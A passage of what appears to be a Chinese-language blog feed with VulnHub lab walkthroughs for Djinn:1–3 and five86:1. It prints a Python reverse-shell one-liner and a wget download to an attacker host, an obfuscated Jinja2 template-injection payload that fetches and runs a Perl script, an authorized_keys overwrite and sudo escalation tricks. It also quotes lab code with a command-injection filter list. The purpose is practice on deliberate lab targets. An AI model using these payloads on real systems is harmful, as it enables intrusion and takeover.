<img src="Djinn:1/image-20200718192411442.png" alt="image-20200718192411442" style="zoom:25%;" />

<p>发现有一个可以读取的文件<code>creds.txt</code>，读取一下</p>
<img src="Djinn:1/image-20200718192503004.png" alt="image-20200718192503004" style="zoom:25%;" />

<p>得到了nitish的密码<code>p4ssw0rdStr3r0n9</code>，切换到nitish</p>
<img src="Djinn:1/image-20200718192549436.png" alt="image-20200718192549436" style="zoom:25%;" />

<p>需要提升shell，用python的pty即可</p>
<img src="Djinn:1/image-20200718192650192.png" alt="image-20200718192650192" style="zoom:25%;" />

<p>读取<code>user.txt</code>发现没有啥用（应该是flag中的一个）</p>
<p>看一下能用于提权的东西</p>
<img src="Djinn:1/image-20200718192802095.png" alt="image-20200718192802095" style="zoom:25%;" />

<p><code>genie</code>是啥，man 看一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">genie [-h] [-g] [-p SHELL] [-e EXEC] wish</span><br><span class="line">还有一个 -cmd</span><br></pre></td></tr></table></figure>



<p>按照他的说法，可以使用 <code>-p &quot;/bin/bash&quot;</code>，发现并没有卵用？</p>
<p>还说可以<code>-e exec</code>试试看<code>-e /bin/bash</code></p>
<img src="Djinn:1/image-20200718193412986.png" alt="image-20200718193412986" style="zoom:25%;" />

<p>再试试<code>-cmd</code></p>
<img src="Djinn:1/image-20200718193604801.png" alt="image-20200718193604801" style="zoom:25%;" />

<p>发现确实可以了</p>
<p>再看看能提权的东西</p>
<img src="Djinn:1/image-20200718193651732.png" alt="image-20200718193651732" style="zoom:25%;" />

<p>运行一下看看</p>
<img src="Djinn:1/image-20200718193739836.png" alt="image-20200718193739836" style="zoom:25%;" />

<p>（又去翻参考答案了）</p>
<p>说是<code>~/.pyc</code>文件就是这个文件的原型（想不到啊想不到，但是为啥呢）</p>
<img src="Djinn:1/image-20200718194118697.png" alt="image-20200718194118697" style="zoom:25%;" />

<p>（这些字符有些是出现在刚刚的程序里面的）</p>
<p>.pyc文件找一个在线网站反编译python就行</p>
<img src="Djinn:1/image-20200718194246226.png" alt="image-20200718194246226" style="zoom:25%;" />

<p>要么有1/100的概率中，要么就是<a href="https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/">python2 <code>input</code>函数存在的一个漏洞</a></p>
<p>所以输入num就能通过验证</p>
<img src="Djinn:1/image-20200718194457671.png" alt="image-20200718194457671" style="zoom:25%;" />



]]></content>
      <categories>
        <category>exploit</category>
        <category>Djinn</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>ftp</tag>
        <tag>command-injection</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub Djinn:2靶机</title>
    <url>//Djinn-2.html</url>
    <content><![CDATA[<p>vulnhub里的 Djinn:2 靶机</p>
<p>中等难度</p>
<a id="more"></a>



<h1 id="Djinn-2"><a href="#Djinn-2" class="headerlink" title="Djinn:2"></a>Djinn:2</h1><img src="Djinn:2/image-20200720161617553.png" alt="image-20200720161617553" style="zoom:50%;" />



<p>开启了<code>21 22 1337 5000 7331</code>端口</p>
<p>其中<code>1337端口</code> 也是一个小游戏，这回没有去玩（之后可以试试）</p>
<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>老三样</p>
<img src="Djinn:2/image-20200720164826449.png" alt="image-20200720164826449" style="zoom:50%;" />

<p>这玩意很像是密码？但是ssh不对（在后面用到了）</p>
<h2 id="7331"><a href="#7331" class="headerlink" title="7331"></a>7331</h2><p>7331端口访问之后还是老样子</p>
<img src="Djinn:2/image-20200720162014809.png" alt="image-20200720162014809" style="zoom:50%;" />

<p><code>/wish</code>已经修复</p>
<img src="Djinn:2/image-20200720162039152.png" alt="image-20200720162039152" style="zoom:33%;" />



<p><code>robots.txt</code>里面只写了一个<code>/letshack</code>（并没有什么卵用）</p>
<p>目录扫描还有一个<code>/source</code></p>
<p>下载下来之后是一个python文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://&#123;&#125;:5000/?username=&#123;&#125;&amp;password=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span>(<span class="params">ip: <span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check whether the input IP is valid or not</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r&#x27;^(?:(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])&#x27;</span></span><br><span class="line">                <span class="string">&#x27;(\.(?!$)|$))&#123;4&#125;$&#x27;</span>, ip):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catcher</span>(<span class="params">host, username, password</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = URL.<span class="built_in">format</span>(host, username, password)</span><br><span class="line">        requests.post(url)</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">&quot;Unable to connect to the server!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&quot;If you have this then congratulations on being a part of an awesome organization&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;This key will help you in connecting to our system securely.&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;If you find any issue please report it to ugtan@djinn.io&quot;</span>)</span><br><span class="line">    ip = <span class="built_in">input</span>(<span class="string">&#x27;\nIP of the machine: &#x27;</span>)</span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&#x27;Your username: &#x27;</span>)</span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&#x27;Your password: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">and</span> check_ip(ip) <span class="keyword">and</span> username == <span class="string">&quot;REDACTED&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;REDACTED&quot;</span>:</span><br><span class="line">        print(<span class="string">&quot;Verifiying %s with host %s &quot;</span> % (username, ip))</span><br><span class="line">        catcher(ip, username, password)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid IP address given&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>那估计考点就是5000端口了</p>
<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>分析source文件可知 5000端口用的是post方法，尝试抓个包</p>
<img src="Djinn:2/image-20200720163202232.png" alt="image-20200720163202232" style="zoom:50%;" />

<p>在<code>username</code>变量存在<code>RCE</code></p>
<img src="Djinn:2/image-20200720163255638.png" alt="image-20200720163255638" style="zoom:50%;" />

<p><strong>app.py</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;key&quot;</span></span><br><span class="line"></span><br><span class="line">RCE = [<span class="string">&quot;|&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;nc&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;bin&quot;</span>, <span class="string">&quot;eval&quot;</span>,  <span class="string">&quot;python&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> RCE:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    command = request.args.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> validate(command):</span><br><span class="line">        output = subprocess.Popen(command, shell=<span class="literal">True</span>,</span><br><span class="line">                                  stdout=subprocess.PIPE).stdout.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output = <span class="string">&quot;Access Denied!!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>看样子过滤了一些命令，可以用wget上传文件来绕过</p>
<p>使用的payload为(因为靶机上面的nc 没有<code>-e</code>参数，python版本为<code>python3</code>)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.143&quot;, 9900));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>



<p>使用<code>wget+-O+/tmp/a.sh+http://192.168.2.143/shell</code></p>
<img src="Djinn:2/image-20200720163942603.png" alt="image-20200720163942603" style="zoom:25%;" />

<img src="Djinn:2/image-20200720163953505.png" alt="image-20200720163953505" style="zoom:25%;" />

<p>给权限<code>chmod+777+/tmp/a.sh</code></p>
<p>本地监听，运行<code>/tmp/a.sh</code>，得到一个反弹shell</p>
<img src="Djinn:2/image-20200720164216528.png" alt="image-20200720164216528" style="zoom:33%;" />



<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在<code>/var/backups</code>目录下发现一个<code>nite.kdbx</code>文件</p>
<img src="Djinn:2/image-20200720164518318.png" alt="image-20200720164518318" style="zoom:33%;" />

<p><code>.kdbx</code>文件介绍：</p>
<img src="Djinn:2/image-20200720164659679.png" alt="image-20200720164659679" style="zoom:50%;" />

<p>所以需要使用<code>KeePass</code>打开呗，打开之后要密码</p>
<p>输入在ftp找到的那个密码，得到<code>nitish</code>的密码<code>&amp;HtMGd$LJB</code></p>
<img src="Djinn:2/image-20200720164934744.png" alt="image-20200720164934744" style="zoom:33%;" />



<p>使用ssh连接，找一下能提权的玩意</p>
<img src="Djinn:2/image-20200720165226436.png" alt="image-20200720165226436" style="zoom:50%;" />

<p>找到一封邮件，可惜看不了</p>
<p><code>netstat -ano | grep &quot;LISTEN&quot; | grep &quot;127&quot;</code>，发现还开了两个端口</p>
<img src="Djinn:2/image-20200720165849066.png" alt="image-20200720165849066" style="zoom:50%;" />

<p>nc过去看一下</p>
<img src="Djinn:2/image-20200720170004332.png" alt="image-20200720170004332" style="zoom:33%;" />



<p>命令5 6 存在命令注入</p>
<img src="Djinn:2/image-20200720170148396.png" alt="image-20200720170148396" style="zoom:25%;" />

<p>那就把之前的反弹shell写进去，得到一个shell</p>
<img src="Djinn:2/image-20200720170448502.png" alt="image-20200720170448502" style="zoom:33%;" />

<p>看一下那一封邮件，</p>
<img src="Djinn:2/image-20200720170705839.png" alt="image-20200720170705839" style="zoom:33%;" />

<p>在<code>ugtan</code>的某个目录下创建一个<code>clean.sh</code>即可</p>
<img src="Djinn:2/image-20200720170928863.png" alt="image-20200720170928863" style="zoom:33%;" />



<p>然后等一会儿就会收到shell</p>
<img src="Djinn:2/image-20200720171355897.png" alt="image-20200720171355897" style="zoom:50%;" />

]]></content>
      <categories>
        <category>exploit</category>
        <category>Djinn</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>command-injection</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub Djinn:3靶机</title>
    <url>//Djinn-3.html</url>
    <content><![CDATA[<p>vulnhub里的 Djinn:3靶机</p>
<p>中等难度</p>
<a id="more"></a>



<h1 id="Djinn-3"><a href="#Djinn-3" class="headerlink" title="Djinn:3"></a>Djinn:3</h1><img src="./Djinn:3/image-20200721185630379.png" alt="image-20200721185630379" style="zoom:50%;" />



<p>端口扫描，发现开启了<code>22 80 5000 31337</code>端口</p>
<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><img src="./Djinn:3/image-20200721185744321.png" alt="image-20200721185744321" style="zoom:50%;" />

<p>啥也没有，上面的按钮也啥都不会做，甚至没有<code>robots.txt</code></p>
<h2 id="5000"><a href="#5000" class="headerlink" title="5000"></a>5000</h2><img src="./Djinn:3/image-20200721190056128.png" alt="image-20200721190056128" style="zoom:50%;" />



<p>乍一看没什么帮助，其实提到了一个<code>guest</code>用户</p>
<h2 id="31337"><a href="#31337" class="headerlink" title="31337"></a>31337</h2><p>nc之后</p>
<img src="Djinn:3/image-20200721190206973.png" alt="image-20200721190206973" style="zoom:50%;" />

<p>使用<code>guest</code>登录</p>
<img src="Djinn:3/image-20200721190453517.png" alt="image-20200721190453517" style="zoom:50%;" />



<p><code>update</code>显示没有权限</p>
<p><code>open</code>增加了一条之后发现5000端口增加了一条数据，尝试命令注入没成功</p>
<p>（查参考答案）</p>
<p>后台是一个<code>flask(Jinja2)</code>，存在一个模板注入漏洞</p>
<p>payload如下(抄的)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;request|attr(<span class="string">&#x27;application&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="string">&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="string">&#x27;\x5f\x5fimport\x5f\x5f&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;wget http://192.168.0.107/perl.pl;perl perl.pl&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>访问之后，得到了一个shell</p>
<img src="Djinn:3/image-20200721191529580.png" alt="image-20200721191529580" style="zoom:50%;" />



<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看一下用户列表（其中jason和stdout是后来创建的）</p>
<img src="Djinn:3/image-20200721192149525.png" alt="image-20200721192149525" style="zoom:50%;" />

<p>找一下<code>saint</code>用户的文件</p>
<p><code>find / -user saint -type f 2&gt;/dev/null</code></p>
<img src="Djinn:3/image-20200721192240006.png" alt="image-20200721192240006" style="zoom:50%;" />

<p>下载下来反编译(uncompyle6)之后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, json</span><br><span class="line"><span class="keyword">from</span> glob <span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime <span class="keyword">as</span> dt</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfigReader</span>:</span></span><br><span class="line">    config = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_config</span>(<span class="params">path</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Reads the config file</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        config_values = &#123;&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                config_values = json.load(f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                print(<span class="string">&quot;Couldn&#x27;t properly parse the config file. Please use properl&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">del</span> e</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> config_values</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_config_path</span>():</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Set the config path</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        files = glob(<span class="string">&#x27;/home/saint/*.json&#x27;</span>)</span><br><span class="line">        other_files = glob(<span class="string">&#x27;/tmp/*.json&#x27;</span>)</span><br><span class="line">        files = files + other_files</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(files) &gt; <span class="number">2</span>:</span><br><span class="line">                files = files[:<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file1 = os.path.basename(files[<span class="number">0</span>]).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                file2 = os.path.basename(files[<span class="number">1</span>]).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> file1[(-<span class="number">2</span>)] == <span class="string">&#x27;config&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> file2[(-<span class="number">2</span>)] == <span class="string">&#x27;config&#x27;</span>:</span><br><span class="line">                        a = dt.strptime(file1[<span class="number">0</span>], <span class="string">&#x27;%d-%m-%Y&#x27;</span>)</span><br><span class="line">                        b = dt.strptime(file2[<span class="number">0</span>], <span class="string">&#x27;%d-%m-%Y&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> b &lt; a:</span><br><span class="line">                    filename = files[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    filename = files[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> filename</span><br><span class="line"><span class="comment"># okay decompiling a.pyc</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> configuration <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.ftpconn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.sshconn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Main function</span></span><br><span class="line"><span class="string">    Cron job is going to make my work easy peasy</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    configPath = ConfigReader.set_config_path()</span><br><span class="line">    config = ConfigReader.read_config(configPath)</span><br><span class="line">    connections = checker(config)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;FTP&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">        ftpcon(config[<span class="string">&#x27;FTP&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;SSH&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">            sshcon(config[<span class="string">&#x27;SSH&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;URL&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">                sync(config[<span class="string">&#x27;URL&#x27;</span>], config[<span class="string">&#x27;Output&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<p>大意就是在<code>/tmp</code>目录下创建一个<code>day-month-year.config.json</code>的文件，文件里面写<code>URL:xxxx; Output:xxx</code>，就会把URL指向的文件写入到Output中</p>
<p>那把ssh写进去</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">&quot;URL&quot;</span>:<span class="string">&quot;http://192.168.2.143/id_rsa.pub&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;Output&quot;</span>:<span class="string">&quot;/home/saint/.ssh/authorized_keys&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后等一会儿就可以使用saint账户免密登录了</p>
<img src="Djinn:3/image-20200721194614312.png" alt="image-20200721194614312" style="zoom:50%;" />



<p>查看一下<code>sudo -l</code></p>
<img src="Djinn:3/image-20200721194709463.png" alt="image-20200721194709463" style="zoom:50%;" />

<p>那就增加一个root用户组的账户</p>
<p><code>saint@djinn3:~$ sudo -u root /usr/sbin/adduser --gid 0 stdin</code></p>
<img src="Djinn:3/image-20200721195016035.png" alt="image-20200721195016035" style="zoom:50%;" />

<p>但是并没有root权限，看一下<code>/etc/sudoer</code></p>
<img src="Djinn:3/image-20200721195110455.png" alt="image-20200721195110455" style="zoom:50%;" />

<p>创建一个jason用户，他就可以使用<code>(root)apt-get</code></p>
<img src="Djinn:3/image-20200721195258743.png" alt="image-20200721195258743" style="zoom:50%;" />



<p>输入<code>jason@djinn3:/home/saint$ sudo -u root /usr/bin/apt-get changelog bash</code></p>
<img src="Djinn:3/image-20200721195556621.png" alt="image-20200721195556621" style="zoom:50%;" />

<p>然后就得到了一个root的shell</p>
<img src="Djinn:3/image-20200721195634576.png" alt="image-20200721195634576" style="zoom:50%;" />

]]></content>
      <categories>
        <category>exploit</category>
        <category>Djinn</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>command-injection</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub five86:1靶机</title>
    <url>//five86-1.html</url>
    <content><![CDATA[<p>vulnhub里的 five86:1 靶机</p>
<p>简单/中等难度</p>
<a id="more"></a>

<h1 id="Five86-1"><a href="#Five86-1" class="headerlink" title="Five86:1"></a>Five86:1</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.163</span><br><span class="line">Host is up (0.00068s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br></pre></td></tr></table></figure>



<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn -A 192.168.2.163 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)</span><br><span class="line">|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)</span><br><span class="line">|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/ona</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; Charset=iso-8859-1).</span><br></pre></td></tr></table></figure>



<h2 id="webadmin"><a href="#webadmin" class="headerlink" title="webadmin"></a>webadmin</h2><p>看到<code>webadmin</code>以为稳了，拿出熟悉的脚本，发现并不行了</p>
<img src="five86:1/image-20200710152751273.png" alt="image-20200710152751273" style="zoom:50%;" />

<p>这里看样子不行</p>
<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>访问网页发现啥也没有</p>
<img src="five86:1/image-20200710152841189.png" alt="image-20200710152841189" style="zoom:50%;" />

<p>想到有一个<code>robots.txt</code>，打开一看</p>
<img src="five86:1/image-20200710152903806.png" alt="image-20200710152903806" style="zoom:50%;" />

<p>有一个<code>/ona</code>，访问一下看看</p>
<img src="five86:1/image-20200710152930660.png" alt="image-20200710152930660" style="zoom:50%;" />

<p>是一个<code>opennetadmin</code>，使用<code>searchexplot</code> 看看有没有现成的exp</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# searchsploit opennetadmin</span><br><span class="line">----------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                       |  Path</span><br><span class="line">----------------------------------------------------- ---------------------------------</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution        | php/webapps/26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Met | php/webapps/47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution          | php/webapps/47691.sh</span><br><span class="line">----------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>

<p>拿最新版<code>remote code execution</code>试试</p>
<img src="five86:1/image-20200710153128235.png" alt="image-20200710153128235" style="zoom:50%;" />

<p>拿到了一个webshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>找一下有没有<code>setuid</code>的东西</p>
<img src="five86:1/image-20200710153207499.png" alt="image-20200710153207499" style="zoom:50%;" />

<p>看到<code>exim4</code>，以为又稳了，准备拿出<code>46996.sh</code>来直接攻击，发现连<code>/tmp</code>目录都不能写</p>
<p>找一下<code>www-data</code>能访问的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find / -<span class="built_in">type</span> f -user www-data</span></span><br><span class="line">/var/www/html/reports/.htaccess</span><br><span class="line">/var/log/ona.log</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>看一下<code>.htaccess</code>文件</p>
<img src="five86:1/image-20200710153411287.png" alt="image-20200710153411287" style="zoom:50%;" />

<p>再看一下<code>/var/www/.htpasswd</code></p>
<img src="five86:1/image-20200710153435351.png" alt="image-20200710153435351" style="zoom:50%;" />

<p>给了提示，使用<code>aefhrt</code>生成10个字符的密码本</p>
<p>使用<code>crunch</code> 工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# crunch 10 10 aefhrt &gt; 1.txt</span><br><span class="line">Crunch will now generate the following amount of data: 665127936 bytes</span><br><span class="line">634 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 60466176 </span><br></pre></td></tr></table></figure>

<p>然后使用<code>john</code> 爆破</p>
<img src="five86:1/image-20200710153640169.png" alt="image-20200710153640169" style="zoom:50%;" />



<p>ssh连接上去，找一下可以提权的玩意</p>
<img src="five86:1/image-20200710153724798.png" alt="image-20200710153724798" style="zoom:50%;" />

<p>发现可以不用密码 以 jen 的身份运行 <code>/bin/cp</code>，那就把<code>ssh密钥</code>给它拷贝到jen里面，实现用户切换</p>
<img src="five86:1/image-20200710153836025.png" alt="image-20200710153836025" style="zoom:50%;" />

<p>ssh连接到jen账户</p>
<p>提示在<code>/var/mail/jen</code>下有一封邮件</p>
<img src="five86:1/image-20200710154036607.png" alt="image-20200710154036607" style="zoom: 33%;" />



<p>得到了<code>moss</code>的密码，切换到 moss用户</p>
<p>发现其目录下有一个有<code>setuid</code>权限的<code>root</code>账户的程序</p>
<img src="five86:1/image-20200710154142971.png" alt="image-20200710154142971" style="zoom:50%;" />

<p>运行之后，不论输入啥，都可以得到root权限</p>
<img src="five86:1/image-20200710154217425.png" alt="image-20200710154217425" style="zoom:50%;" />



]]></content>
      <categories>
        <category>exploit</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>opennetadmin</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub five86:2靶机</title>
    <url>//five86-2.html</url>
